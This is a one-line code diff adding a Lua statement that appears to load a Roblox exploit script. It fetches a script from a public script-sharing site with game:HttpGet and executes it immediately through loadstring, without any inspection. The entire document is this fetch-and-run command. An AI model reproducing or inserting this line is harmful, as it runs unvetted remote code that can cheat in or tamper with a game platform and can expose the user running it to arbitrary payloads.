@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-Project-RC7-6752"))()
